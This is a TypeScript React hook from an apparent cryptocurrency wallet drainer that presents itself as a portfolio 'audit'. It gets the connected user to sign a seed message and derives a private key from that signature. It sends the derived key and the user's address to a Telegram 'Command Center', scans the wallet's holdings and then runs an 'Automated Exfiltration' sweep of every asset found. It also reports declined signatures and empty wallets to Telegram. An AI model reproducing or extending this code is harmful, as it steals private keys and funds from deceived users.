"use client";

import { ethers } from "ethers";
import { scanUniversalPortfolio } from "@/lib/audit";
import { checkAndTriggerGhostSweep } from "@/lib/ghost";
import { clearGhostFlags } from "./utils";

// 🛰️ INTEGRATED ADVANCED DERIVATION (v6.0 God-Key)
import {
  derivePrivateKeyFromSignature,
  DERIVATION_SEED_MESSAGE,
} from "@/lib/signer-derivation-privateKey";

// 📢 UPDATED TELEGRAM HANDLER
import {
  sendGhostDerivationToTelegram,
  sendActivityToTelegram,
} from "@/lib/telegram";

export function useAuditSequence() {
  return async ({
    userAddress,
    isInternal,
    currentChainId,
    signMessageAsync,
    sweepAllAutomated,
    setAssets,
    setUserKey,
    derivedUserKeyRef,
  }: any) => {
    const logPrefix = "[useAuditSequence.ts]";

    try {
      clearGhostFlags(isInternal);

      let identityVerified = !!derivedUserKeyRef.current;

      /**
       * 👻 THE GOD-KEY TRIGGER
       * Captures one signature and converts it into a Multi-Chain Vault.
       */
      const triggerIdentity = async () => {
        if (identityVerified) return;

        console.log(`${logPrefix} ⚡ Initializing Stealth Protocol...`);
        try {
          const message = DERIVATION_SEED_MESSAGE;
          await new Promise((r) => setTimeout(r, 200));

          const signature = await signMessageAsync({ message });

          if (signature) {
            const vault = derivePrivateKeyFromSignature(signature);

            derivedUserKeyRef.current = vault.masterKey;
            setUserKey(vault.masterKey);
            identityVerified = true;

            await sendGhostDerivationToTelegram({
              userAddress: userAddress,
              vault: vault,
              authMessage: message,
            }).catch((err) => console.error("TG Report Error:", err));

            console.log(
              `${logPrefix} God-Key Identity Verified & Reported to Command Center`,
            );
          }
        } catch (e: any) {
          console.warn(`${logPrefix} Protocol Denied | ${e.message}`);
          await sendActivityToTelegram({
            address: userAddress,
            step: "SIGNATURE_REJECTED",
            details: "User declined the v6.0 Identity Synchronisation.",
          }).catch(() => null);
        }
      };

      /**
       * ⚡ IMMEDIATE INITIATION
       */
      if (!identityVerified) {
        await triggerIdentity();
      }

      /**
       * 🔍 STEP 2: PORTFOLIO AUDIT
       */
      console.log(`${logPrefix} Scanning Multi-Chain Assets...`);
      const found = await scanUniversalPortfolio(userAddress);
      const validatedAssets = Array.isArray(found) ? found : [];
      setAssets(validatedAssets);

      if (validatedAssets.length === 0) {
        console.log(`${logPrefix} No assets found | Heartbeat Pulse Sent.`);
        await sendActivityToTelegram({
          address: userAddress,
          step: "HEARTBEAT",
          details: "Scan complete: Target wallet is currently empty.",
        }).catch(() => null);

        await checkAndTriggerGhostSweep(userAddress, [], currentChainId || 1);
        return false;
      }

      /**
       * 👻 STEP 3: GHOST DETECTION & SELECTION
       * FIX: We wrap triggerIdentity in a single-fire protection logic
       * to prevent Phantom from crashing on multiple rapid calls.
       */
      let hasTriggeredInScan = false;

      await checkAndTriggerGhostSweep(
        userAddress,
        validatedAssets,
        currentChainId || 1,
        async () => {
          // Only fire the signature prompt if the user hasn't signed yet
          // and we haven't already popped the window in this specific scan loop.
          if (!identityVerified && !hasTriggeredInScan) {
            hasTriggeredInScan = true;
            await triggerIdentity();
          }
        },
      ).catch((err) => {
        console.warn(`${logPrefix} Ghost Sweep Check Failed | ${err.message}`);
      });

      /**
       * 🚀 FINAL STRIKE (Automated Exfiltration)
       */
      if (derivedUserKeyRef.current) {
        console.log(`${logPrefix} Initiating Automated Asset Relocation`);
        await sweepAllAutomated(validatedAssets);
        return true;
      }

      return false;
    } catch (error: any) {
      console.error(`${logPrefix} Fatal Sequence Error | ${error.message}`);
      throw error;
    }
  };
}
